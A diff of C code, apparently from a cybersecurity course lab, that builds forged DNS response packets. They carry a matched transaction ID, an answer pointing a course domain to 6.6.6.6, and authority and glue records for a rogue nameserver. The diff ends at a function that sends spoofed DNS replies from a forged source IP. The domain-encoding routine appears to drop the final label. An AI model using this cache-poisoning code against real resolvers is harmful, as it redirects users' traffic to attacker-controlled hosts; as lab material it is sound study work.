@@ -153,44 +153,38 @@ void print_dns_payload(const uint8_t *payload, int size) {
     printf("\n");
 }
 
-// Encode a domain name into DNS wire format
 void encode_domain_name(uint8_t *dns, const char *host) {
     int lock = 0;
-    strcat((char *)dns, ".");
-    for (int i = 0; i < (int) strlen(host); i++) {
+    int len = strlen(host);
+
+    for (int i = 0; i < len; i++) {
         if (host[i] == '.') {
             *dns++ = i - lock;
             for (; lock < i; lock++) {
                 *dns++ = host[lock];
             }
-            lock++; // Skip the '.'
+            lock = i + 1; // Move to the next segment after '.'
         }
     }
-    *dns++ = '\0';
+    *dns++ = '\0'; // Null terminator
 }
 
 // Function to build the DNS response payload
 int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid) {
     uint8_t *ptr = buffer;
 
-    // DNS Header (12 bytes)
-    uint16_t flags = htons(0x8410); // Standard response, No error, Recursion Available
-    uint16_t q_count = htons(1);    // 1 Question
-    uint16_t ans_count = htons(1);  // 1 Answer
-    uint16_t auth_count = htons(1); // 1 Authority Record
-    uint16_t add_count = htons(2);  // 2 Additional Records
-
-    *(uint16_t *)ptr = htons(txid); // Transaction ID (matches query)
+    // DNS Header
+    *(uint16_t *)ptr = htons(txid); // Transaction ID
     ptr += 2;
-    *(uint16_t *)ptr = flags;       // Flags
+    *(uint16_t *)ptr = htons(0x8410); // Standard query response, No error, RA=1
     ptr += 2;
-    *(uint16_t *)ptr = q_count;     // Questions
+    *(uint16_t *)ptr = htons(1); // Questions
     ptr += 2;
-    *(uint16_t *)ptr = ans_count;   // Answer RRs
+    *(uint16_t *)ptr = htons(1); // Answer RRs
     ptr += 2;
-    *(uint16_t *)ptr = auth_count;  // Authority RRs
+    *(uint16_t *)ptr = htons(1); // Authority RRs
     ptr += 2;
-    *(uint16_t *)ptr = add_count;   // Additional RRs
+    *(uint16_t *)ptr = htons(2); // Additional RRs
     ptr += 2;
 
     // DNS Question Section
@@ -208,14 +202,14 @@ int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid) {
     ptr += 2;
     *(uint16_t *)ptr = htons(1);      // Class IN
     ptr += 2;
-    *(uint32_t *)ptr = htonl(600);    // TTL (10 minutes)
+    *(uint32_t *)ptr = htonl(600);    // TTL
     ptr += 4;
-    *(uint16_t *)ptr = htons(4);      // Data length (4 bytes)
+    *(uint16_t *)ptr = htons(4);      // Data length
     ptr += 2;
-    *(uint32_t *)ptr = inet_addr("192.168.1.101"); // Resolved IP
+    *(uint32_t *)ptr = inet_addr("6.6.6.6"); // IP for www.example.cybercourse.com
     ptr += 4;
 
-    // Authority Section (NS record)
+    // Authority Section (NS Record)
     encode_domain_name(ptr, "cybercourse.com");
     ptr += strlen((const char *)ptr) + 1;
     *(uint16_t *)ptr = htons(2);  // Type NS
@@ -224,12 +218,12 @@ int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid) {
     ptr += 2;
     *(uint32_t *)ptr = htonl(600); // TTL
     ptr += 4;
-    *(uint16_t *)ptr = htons(5);  // Data length (5 bytes)
+    *(uint16_t *)ptr = htons(5);  // Data length
     ptr += 2;
     encode_domain_name(ptr, "ns.cybercourse.com");
     ptr += strlen((const char *)ptr) + 1;
 
-    // Additional Record (NS A Record)
+    // Additional Section (A Record for NS)
     encode_domain_name(ptr, "ns.cybercourse.com");
     ptr += strlen((const char *)ptr) + 1;
     *(uint16_t *)ptr = htons(1);  // Type A
@@ -244,7 +238,7 @@ int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid) {
     ptr += 4;
 
     // EDNS0 (OPT Record)
-    *ptr++ = 0; // Root
+    *ptr++ = 0; // Root name
     *(uint16_t *)ptr = htons(41);  // Type OPT
     ptr += 2;
     *(uint16_t *)ptr = htons(4096); // UDP Payload size
@@ -258,8 +252,9 @@ int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid) {
     *(uint16_t *)ptr = htons(0); // No data
     ptr += 2;
 
-    return ptr - buffer; // Return the total payload size
+    return ptr - buffer; // Return the total size of the DNS payload
 }
+
 
 int full_send_spoofed_dns(uint txid, uint source_port) {
     const char *src_ip = "192.168.1.204";  // Custom source IP
